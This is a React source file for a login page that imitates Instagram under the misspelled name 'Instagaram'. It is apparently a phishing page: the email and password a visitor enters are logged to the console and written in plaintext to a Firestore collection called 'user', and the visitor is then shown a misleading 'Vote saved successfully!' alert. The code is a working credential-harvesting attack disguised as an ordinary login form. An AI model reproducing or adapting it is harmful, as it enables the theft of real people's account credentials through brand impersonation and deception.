import React, { useState } from "react";
import "bootstrap/dist/css/bootstrap.min.css";
import { db } from "../src/firebaseconfig.js";
import { collection, addDoc } from "firebase/firestore";

function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log("Email:", email);
    console.log("Password:", password);

    // Save data to Firestore

    try {
      // Save data to Firestore
      await addDoc(collection(db, "user"), { email, password });
      alert("Vote saved successfully!");
    } catch (error) {
      console.error("Error saving data: ", error);
      alert("Error saving data");
    }
    alert("Vote saved successfully!");

  };

  return (
    <div className="container d-flex justify-content-center align-items-center vh-100">
      <div className="row shadow-lg rounded p-4 bg-white">
        <div className="col-md-6 d-none d-md-flex align-items-center">
          <img
            src="https://via.placeholder.com/300"
            alt="Instagaram"
            className="img-fluid rounded"
          />
        </div>
        <div className="col-md-6">
          <div className="text-center mb-4">
            <h1 className="fw-bold text-primary">Instagaram</h1>
            <p className="text-muted">Welcome back! Log in to explore more.</p>
          </div>
          <form onSubmit={handleSubmit}>
            <div className="mb-3">
              <label htmlFor="email" className="form-label">Email Address</label>
              <input
                type="email"
                className="form-control"
                id="email"
                placeholder="Enter your email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
            <div className="mb-3">
              <label htmlFor="password" className="form-label">Password</label>
              <input
                type="password"
                className="form-control"
                id="password"
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
            <div className="d-grid mb-3">
              <button type="submit" className="btn btn-primary btn-lg">Log In</button>
            </div>
            <div className="text-center">
              <small className="text-muted">Forgot your password? <a href="#">Reset it here</a></small>
            </div>
          </form>
          <hr className="my-4" />
          <div className="text-center">
            <p className="mb-0">Don't have an account? <a href="#">Sign up now</a></p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
